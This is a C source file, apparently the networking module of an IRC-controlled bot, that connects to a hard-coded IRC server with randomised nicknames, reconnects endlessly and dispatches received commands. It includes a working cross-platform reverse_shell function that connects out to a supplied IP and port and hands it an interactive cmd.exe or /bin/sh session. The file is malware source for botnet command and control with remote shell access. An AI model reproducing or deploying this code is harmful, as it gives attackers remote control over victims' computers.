#include "pch.h"
#include "net.h"
#include "irc.h"
#include "logger.h"
#ifdef _WIN32
#include <io.h>
#include <stdlib.h>
#endif

void create_socketfd(int* fd) {
    while (1) {
#ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData)) {
            net_sleep(SLEEP_TIME);
            continue;
        }
#endif
        *fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (*fd == INVALID_SOCKET) {
            // #ifdef _WIN32
            // Why no cleaning ? https://docs.microsoft.com/en-us/windows/desktop/api/winsock/nf-winsock-wsacleanup
            // Just like the article says, it will completly free any allocated resource and drop all further connections
            // in this scenario, we will like to try infinite times.
                        // WSACleanup();
            // #endif
            net_sleep(SLEEP_TIME);
            continue;

        }
        else {
            int iOptVal = 0;
            if (setsockopt(*fd, SOL_SOCKET, SO_REUSEADDR, (char const*)&iOptVal, sizeof(iOptVal)) == -1) {
                net_sleep(SLEEP_TIME);
                continue;
            }
            else {
                // Make it non blocking :^)
#ifdef _WIN32
                u_long mode = 0;
                ioctlsocket(*fd, FIONBIO, &mode);
#elif defined(__linux__) || defined(__APPLE__)
                fcntl(*fd, F_SETFL, O_NONBLOCK);
                fcntl(*fd, F_SETFL, O_ASYNC);
#endif
                return;
            }
        }
    }
}

void connect_socket(int* fd) {
    struct sockaddr_in sockin;

    while (1) {
        sockin.sin_family = AF_INET;
        sockin.sin_port = htons(IRC_PORT);
        // Copy ip address to sockein.sin_addr
#ifdef _WIN32
        InetPton(AF_INET, _T(IRC_IP), &sockin.sin_addr.s_addr);
#else
        sockin.sin_addr.s_addr = inet_addr(IRC_IP);
#endif
        // Connect to socket
        if (connect(*fd, (struct sockaddr *)&sockin, sizeof(sockin)) == SOCKET_ERROR) {
            // closesocket(*fd);
#ifdef _WIN32
            int last_error = WSAGetLastError();
            log_message("Could not connect to host. Error: %d\n", last_error);
#else
            log_message("Could not connect to host.\n");
#endif
            net_sleep(SLEEP_TIME);
            continue;
        }
        else {
#ifdef _WIN32
            char ip[IRC_IP_SIZE] = { 0 };
            inet_ntop(AF_INET, &sockin.sin_addr, ip, IRC_IP_SIZE);
            log_message("Connected sockfd to [%s:%d]\n", ip, IRC_PORT);
#else
            log_message("Connected sockfd to [%s:%d]\n", inet_ntoa(sockin.sin_addr), IRC_PORT);
#endif
            char nickname[IRC_MAX_NICKNAME_SIZE];
            char username[IRC_MAX_USER_SIZE];

            generate_nickname(nickname);
            generate_username(username);

            set_nick(*fd, nickname);
            set_user(*fd, username);

            // executing join here is bad because server has not welcome us yet
            join_channel(*fd);
            return;
        }
    }

}

void start_reading_loop(int *fd) {
    while (1) {
#ifdef _WIN32
        CHAR message[IRC_MAX_MSG_SIZE];
#elif defined(__linux__) || defined(__APPLE__)
        char message[IRC_MAX_MSG_SIZE];
#endif
        int read = read_packet(fd, message);
        line_handler_proxy(*fd, message, read);
    }
}


#ifdef _WIN32
void send_packet(int fd, CHAR *packet, size_t packet_size) {
#elif defined(__linux__) || defined(__APPLE__)
void send_packet(int fd, char *packet, size_t packet_size) {
#endif
    send(fd, packet, packet_size, 0);
}

#ifdef _WIN32
int read_packet(int *fd, CHAR *buffer) {
#elif defined(__linux__) || defined(__APPLE__)
int read_packet(int *fd, char *buffer) {
#endif
    size_t length = 0;
    // This pattern is applied because we want to make sure there is no overflow
    while (1) {
#ifdef _WIN32
        CHAR data;
#elif defined(__linux__) || defined(__APPLE__)
        char data;
#endif
        int read = recv(*fd, &data, 1, 0);

        if ((read <= 0) || (data == EOF)) {
            log_message("Connection closed\n");
            net_sleep(60);
            // Trying to reconnect after 60 s
            create_socketfd(fd);
            connect_socket(fd);
            continue;
        }

        buffer[length] = data;
        length++;

        if (length == IRC_MAX_MSG_SIZE) {
            return IRC_MAX_MSG_SIZE;
        }

        if (length >= 2 && buffer[length - 2] == '\r' && buffer[length - 1] == '\n') {
            buffer[length - 2] = '\0';
            return length;
        }
    }
}

#ifdef _WIN32
void reverse_shell(CHAR *ip, int port) {
    WSADATA wsa_data;
    SOCKET shell_fd;
    Sleep(2000);
#else
void reverse_shell(char *ip, int port) {
    int shell_fd;
#endif
    struct sockaddr_in sockin;
    sockin.sin_family = AF_INET;
    sockin.sin_port = htons(port);
#ifdef _WIN32
    wchar_t* ip_w = new wchar_t[IP_MAX_SIZE];
    MultiByteToWideChar(CP_ACP, 0, ip, -1, ip_w, IP_MAX_SIZE);
    InetPton(AF_INET, ip_w, &sockin.sin_addr.s_addr);
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data)) {
        return;
    }
    shell_fd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
#else
    sockin.sin_addr.s_addr = inet_addr(ip);
    shell_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
#endif // _WIN32

#ifdef _WIN32
    if (WSAConnect(shell_fd, (SOCKADDR*)&sockin, sizeof(sockin), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        log_message("Could not connect\n");
        closesocket(shell_fd);
        WSACleanup();
        return;
    }

    wchar_t proc[8] = L"cmd.exe";
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)shell_fd;
    send(shell_fd, SHELL_MOTD, strlen(SHELL_MOTD), 0);
    CreateProcess(NULL, proc, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
    closesocket(shell_fd);
    WSACleanup();

#else
    if (connect(shell_fd, (struct sockaddr *)&sockin, sizeof(sockin)) == SOCKET_ERROR) {
        log_message("Could not connect\n");
        close(shell_fd);
        return;
    }

    write(shell_fd, SHELL_MOTD, strlen(SHELL_MOTD));

    dup2(shell_fd, 0);
    dup2(shell_fd, 1);
    dup2(shell_fd, 2);

    execl("/bin/sh", "sh", "-i", NULL, NULL);
    close(shell_fd);
#endif

}

// Private methods

void net_sleep(int seconds) {
#ifdef _WIN32
    Sleep(seconds * 1000);
#endif
#if defined(__linux__) || defined(__APPLE__)
    sleep(seconds);
    fflush(stdout);
#endif
}
